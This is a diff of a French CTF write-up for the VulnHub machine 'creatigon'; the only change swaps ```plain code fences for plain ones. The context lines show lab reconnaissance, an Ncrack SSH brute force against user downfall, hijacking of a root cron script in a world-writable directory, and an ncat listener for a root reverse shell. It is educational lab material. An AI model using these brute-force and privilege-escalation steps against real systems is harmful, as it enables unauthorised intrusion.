@@ -8,7 +8,7 @@ tags: [CTF, VulnHub]
 Montrer patte blanche
 ---------------------
 
-```plain
+```
 Nmap scan report for 192.168.2.3
 Host is up (0.00047s latency).
 Not shown: 65496 closed ports, 37 filtered ports
@@ -39,7 +39,7 @@ J'ai testé quelques attaques comme injection SQL, interprétation PHP, SSI... s
 
 J'ai vu que *Nmap* a trouvé un *robots.txt*, c'est peut être le moment de se pencher dessus :  
 
-```plain
+```
 User-agent: *
 Disallow: Use Brain with Google
 
@@ -81,7 +81,7 @@ with open(sys.argv[1]) as fd:
 
 On y passe la wordlist RockYou et on finit par avoir un résultat :  
 
-```plain
+```
 Special case with cyberdog
 ```
 
@@ -123,7 +123,7 @@ Ca nous permet de découvrir le fichier *887beed152a3e8f946857bade267bb19d159ef5
 
 Ce fichier nous donne l'étape suivante :  
 
-```plain
+```
 Well Done! Next step are waiting..
 
 IP/d5fa314e8577e3a7b8534a014b4dcb221de823ad
@@ -155,7 +155,7 @@ Comme le téléchargement et la compilation est faite dans la foulée il faut av
 
 On utilise ensuite le script au nom pas vraiment évident :  
 
-```plain
+```
 ./gen_coll_test.py
 Stage 1 of 8
 Stage 2 of 8
@@ -199,7 +199,7 @@ Alpinisme Unix
 
 On a le système suivant :  
 
-```plain
+```
 Linux creatigon 4.9.0-4-amd64 #1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux
 
 Distributor ID:	Debian
@@ -210,19 +210,19 @@ Codename:	stretch
 
 Et un utilisateur qui est certainement notre prochaine étape :  
 
-```plain
+```
 uid=1000(downfall) gid=1000(downfall) groups=1000(downfall),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth)
 ```
 
 Quand on recherche les fichiers de l'utilisateur on se rend compte qu'il reçoit des mails régulièrement (date de sa spool continuellement à jour)... il y a du CRON dans l'air :  
 
-```plain
+```
 -rw-rw---- 1 downfall mail 1112412 Feb 18 20:19 /var/mail/downfall
 ```
 
 Dans le dossier personnel de l'utilisateur il y a aussi un fichier *todo.txt* :  
 
-```plain
+```
 hey i am homeless guy. Now i living near python.
 
 Try Harder!
@@ -232,7 +232,7 @@ Thanks.
 
 Pour ce qui est des fichiers appartenant au groupe de l'utilisateur (*downfall*) on a l'entrée suivante :  
 
-```plain
+```
 -rwxrw-r-- 1 root downfall 78 Dec  6 06:14 /lib/logs/homeless.py
 ```
 
@@ -246,7 +246,7 @@ print "Hello, Bosss!,\nI am clearning your room"
 
 Point important, le dossier */lib/logs* est world-writable :  
 
-```plain
+```
 drwxrwxrwx 2 root root 4096 Dec  6 06:14 /lib/logs/
 ```
 
@@ -256,7 +256,7 @@ Et... il n'arrive pas. D'ailleurs je ne trouve aucune référence dans les entr�
 
 Dans */etc/aliases* on trouve les ligne ssuivantes :  
 
-```plain
+```
 # /etc/aliases
 mailer-daemon: postmaster
 postmaster: root
@@ -312,7 +312,7 @@ Une solution plus performante serait de se baser sur *inotify* (exercice laissé
 
 En tout cas ça m'a été utile :  
 
-```plain
+```
 30747 root /usr/sbin/cron -f
 30748 root /bin/sh -c cd /lib/logs/ && ./homeless.py
 30750 root /bin/sh -c cd /lib/logs/ && ./homeless.py
@@ -334,13 +334,13 @@ Ncrack attack
 
 Dans un premier temps j'ai fait le tri sur *RockYou* :  
 
-```plain
+```
 grep -i -e "^sec" /opt/wordlists/rockyou.txt > seclist.txt
 ```
 
 et Ncrack a fait le reste :  
 
-```plain
+```
 $ ncrack -u downfall -P seclist.txt -T4 ssh://192.168.2.3
 
 Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-02-22 21:15 CET
@@ -355,7 +355,7 @@ Ncrack finished.
 
 En regardant les mails de l'utilisateur on voit que c'était un indice supplémentaire :  
 
-```plain
+```
 downfall@creatigon:~$ mail
 "/var/mail/downfall": 2202 messages 2202 new
 >N   1 Cron Daemon        Tue Dec  5 12:30  21/773   Cron <root@creatigon> root /lib/logs/homeless.py
@@ -388,7 +388,7 @@ X-UID: 2116
 
 Désormais on peut placer les commandes que l'on souhaite dans le script Python et obtenir notre reverse shell root :  
 
-```plain
+```
 $ ncat -l -p 9999 -v
 Ncat: Version 7.01 ( https://nmap.org/ncat )
 Ncat: Listening on :::9999
